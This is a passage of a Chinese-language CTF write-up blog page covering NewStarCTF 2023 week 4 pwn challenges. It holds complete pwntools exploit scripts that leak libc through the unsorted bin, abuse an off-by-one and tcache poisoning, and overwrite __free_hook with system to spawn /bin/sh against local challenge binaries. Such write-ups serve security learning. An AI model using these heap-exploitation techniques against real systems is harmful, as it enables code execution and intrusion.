class="number">2</span>+p64(stack+<span class="number">0</span>x2a0))</span><br><span class="line">#把指针指向fd</span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>这里面包含的知识点就是修改一个头为0x441大小的堆，并释放到unsorted bin。<br>
+这个时候fd和bk就会保存着libc上的地址，也就是main_arena。</p>
+<p>因为libc-2.31在释放的时候会检查尾部（是否溢出），所以要构造一个0x31+0x411的结构。#存在点疑问</p>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/0161995c524635fe87689d0c06801277.png" alt=""></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"><span class="attribute">io</span>=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">elf</span>=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">libc</span>=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="attribute">context</span>.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> cmd(idx):</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> add(idx,size,content):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(str(size))</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> show(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> edit(idx,content):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> delete(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> dbg():</span><br><span class="line">    <span class="attribute">gdb</span>.attach(io)</span><br><span class="line">    <span class="attribute">pause</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>,<span class="number">0</span>x<span class="number">400</span>,b&#x27;a&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">1</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;b&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">2</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;c&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">3</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;d&#x27;*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">3</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">4</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;e&#x27;) # <span class="number">4</span> = <span class="number">2</span> -&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">show</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">stack</span> = u<span class="number">64</span>(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, b&#x27;\x<span class="number">00</span>&#x27;)) -<span class="number">0</span>x<span class="number">865</span></span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;stack -&gt; &quot;</span> + hex(stack))</span><br><span class="line"></span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,p<span class="number">64</span>(<span class="number">0</span>x<span class="number">50</span>)+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(stack+<span class="number">0</span>x<span class="number">290</span>))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">1</span>,p<span class="number">64</span>(<span class="number">0</span>)+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">441</span>))</span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,p<span class="number">64</span>(<span class="number">0</span>x<span class="number">50</span>)+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(stack+<span class="number">0</span>x<span class="number">2</span>a<span class="number">0</span>))</span><br><span class="line"><span class="attribute">show</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">libc_base</span>=u<span class="number">64</span>(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b&#x27;\x<span class="number">00</span>&#x27;)) - <span class="number">0</span>x<span class="number">1</span>ECBE<span class="number">0</span></span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;libc_base -&gt; &quot;</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"><span class="attribute">system</span>=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,p<span class="number">64</span>(<span class="number">0</span>x<span class="number">50</span>)+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(free_hook))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">1</span>,p<span class="number">64</span>(system))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,b<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">io</span>.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="game">game</h2>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/e15be1801eff04f798873a1ac81fd6f9.png" alt=""><br>
+ida查看代码不是很好看懂，<br>
+main函数<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/d27de15f4d54c5ce180402878ca80b25.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/36644a6804869c5503b57b813ea98516.png" alt=""><br>
+myread函数<br>
+也就是把v6设置为0，这样子我们就可以拿原石了。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/52654998309bdd3435dd499d1cc89adc.png" alt=""><br>
+又原又穹之后我们可以进入隐藏的第三种选项。<br>
+<code> ((&amp;puts - v3 - v7))(v5)</code><br>
+提前设置v5为/bin/sh\x00<br>
+<code>&amp;puts-&amp;system=0x32190</code><br>
+也就是我们要拿三次原石再输入一个短整型。</p>
+<p><code>__isoc99_scanf(&quot;%hd&quot;, &amp;v3);  // %hd要求我们输入一个短整形值</code><br>
+这个就使我们不能泄露出system地址，调用ROP来getshell。</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">io</span>=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def cmd(idx):</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">io</span>.recv()</span><br><span class="line"><span class="built_in">io</span>.send(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload=str(<span class="number">0x2190</span>) #&amp;puts-&amp;system=<span class="number">0x32190</span></span><br><span class="line"><span class="built_in">io</span>.recv()</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="god-of-change">god_of_change</h2>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/c6b3ebeebb36a8fe656f277a1bcc71bf.png" alt=""><br>
+保护全开<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/6fcc8cd7a56f648bb0d67101d7968757.png" alt=""><br>
+三个简单的功能<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/d1f825563894cb29fabcc16ac85c0e3b.png" alt=""><br>
+add这里多写入了一个字节，off_by_one。<br>
+同时限制了对写入内容的大小进行了限制，不能直接申请一个0x410大小的chunk<br>
+delete函数<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/6f406ead9e672492073e8c09c0e9b6b8.png" alt=""><br>
+free指针没有置为0。</p>
+<p>我的一些错误思路。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">48</span>,b&#x27;a&#x27;*<span class="number">4</span>) #<span class="number">0</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">48</span>,b&#x27;b&#x27;*<span class="number">4</span>) #<span class="number">1</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">48</span>,b&#x27;c&#x27;*<span class="number">4</span>) #<span class="number">2</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">48</span>,b&#x27;d&#x27;*<span class="number">4</span>) #<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">48</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">48</span>+p<span class="number">8</span>(<span class="number">0</span>x<span class="number">61</span>)) # <span class="number">4</span>-&gt;<span class="number">0</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">58</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">48</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">441</span>)) #<span class="number">5</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+<p>这里直接就报错了。具体原因是没有过unlink的检查。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/d82092135f3b76ff311b533040b5b980.png" alt=""><br>
+unlink源码，我没有过第一个检查。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/e1a9d2f555e2f64795a9b72960a63890.png" alt=""><br>
+这里我们free堆指向的地址处没有一个指向堆的结构。就会导致通不过检查。<br>
+free bin的地址加上size应该指向另外一个chunk。</p>
+<p>还有一个问题是之前构造堆布局错误的时候，我free掉的东西会进入tcahche。这是因为tchahce只能容纳七个bin，当超过七个的时候才会进入unsorted bin。</p>
+<h3 id="exp1">exp1</h3>
+<h4 id="leak-libc">leak libc</h4>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">for</span> i in range (<span class="number">13</span>): #<span class="number">0</span>-&gt;<span class="number">12</span></span><br><span class="line">    <span class="attribute">add</span>(<span class="number">0</span>x<span class="number">68</span>,b&#x27;X&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">68</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">8</span>(<span class="number">0</span>x<span class="number">81</span>)) # <span class="number">13</span>-&gt;<span class="number">0</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">78</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">461</span>)) #<span class="number">14</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;b&#x27;*<span class="number">8</span>) # <span class="number">15</span> -&gt; <span class="number">2</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;a&#x27;) # <span class="number">16</span></span><br><span class="line"><span class="attribute">show</span>(<span class="number">15</span>)</span><br></pre></td></tr></table></figure>
+<p>我们先申请13个堆，满足更改的0x461的堆能找到一个chunk。<br>
+由于申请的堆的大小有限制，只能溢出一个字节。先修改下一个chunk的size，再通过这个chunk修改下下个chunk的size为0x461。再把这个chunk放入unsortedbin，得到libc的地址。</p>
+<p>泄露地址的时候写入一个b会覆盖一个地址，但是的出来的libc_base总是不对，应该就不是一个固定的偏移。所以用第二个地址来泄露libc_base。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/e3f0cea76a35dc3a48517f083b5f9489.png" alt=""></p>
+<h4 id="覆盖free-hook为system">覆盖free_hook为system</h4>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">delete</span>(<span class="number">16</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">15</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">78</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">21</span>)+p<span class="number">64</span>(free_hook))#<span class="number">17</span>-&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;/bin/sh\x<span class="number">00</span>&#x27;) #<span class="number">18</span> -&gt; <span class="number">2</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,p<span class="number">64</span>(system)) #<span class="number">19</span> -&gt; free_hook</span><br></pre></td></tr></table></figure>
+<p>修改chunk2的fd为free_hook，设置bins上面地址为free_hook，我们再第二次调用的时候就能更改free_hook。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/bee835431557acea391fbdd44ef9b830.png" alt=""></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"><span class="attribute">io</span>=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">elf</span>=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">libc</span>=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="attribute">context</span>.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> dbg():</span><br><span class="line">    <span class="attribute">gdb</span>.attach(io)</span><br><span class="line">    <span class="attribute">pause</span>()</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> cmd(idx):</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(str(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> add(idx,content):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> show(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> delete(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in range (<span class="number">13</span>): #<span class="number">0</span>-&gt;<span class="number">12</span></span><br><span class="line">    <span class="attribute">add</span>(<span class="number">0</span>x<span class="number">68</span>,b&#x27;X&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">68</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">8</span>(<span class="number">0</span>x<span class="number">81</span>)) # <span class="number">13</span>-&gt;<span class="number">0</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">78</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">461</span>)) #<span class="number">14</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;b&#x27;*<span class="number">8</span>) # <span class="number">15</span> -&gt; <span class="number">2</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;a&#x27;) # <span class="number">16</span></span><br><span class="line"><span class="attribute">show</span>(<span class="number">15</span>)</span><br><span class="line"><span class="attribute">libc_base</span>=u<span class="number">64</span>(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,b&#x27;\x<span class="number">00</span>&#x27;))-<span class="number">0</span>x<span class="number">1</span>ecf<span class="number">0</span>a</span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;libc_base -&gt; &quot;</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;free_hook -&gt; &quot;</span> + hex(free_hook))</span><br><span class="line"><span class="attribute">system</span>=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;system -&gt; &quot;</span> + hex(system))</span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">16</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">15</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">14</span>)</span><br><span class="line"><span class="attribute">dbg</span>()</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">78</span>,b&#x27;a&#x27;*<span class="number">0</span>x<span class="number">68</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">21</span>)+p<span class="number">64</span>(free_hook))#<span class="number">17</span>-&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">pause</span>()</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,b&#x27;/bin/sh\x<span class="number">00</span>&#x27;) #<span class="number">18</span> -&gt; <span class="number">5</span></span><br><span class="line"><span class="attribute">pause</span>()</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">10</span>,p<span class="number">64</span>(system))</span><br><span class="line"><span class="attribute">pause</span>()</span><br><span class="line"></span><br><span class="line"><span class="attribute">io</span>.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp2">exp2</h3>
+<h2 id="参考文章">参考文章</h2>
+<p>很菜，看的别的师傅的wp和官方wp复盘的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52640415/article/details/134129008">[BUUCTF NewStarCTF 2023 公开赛道] week4 crypto/pwn-CSDN博客</a></p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          
+          <li class="next">
+            <a href="/undefined/1/" data-toggle="tooltip" data-placement="top" title="1">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=2023 newstartctf week4 复盘&body=Hi,I found this website and thought you might like it http://yoursite-url/2023 newstartctf pwn 复盘/2023 newstartctf week4 pwn 复盘/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: '',
+      clientSecret: '',
+      repo: '',
+      owner: '',
+      admin: '',
+      id: 'Thu Nov 16 2023 20:42:49 GMT+0800', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: false,
+      language: 'en',
+      proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
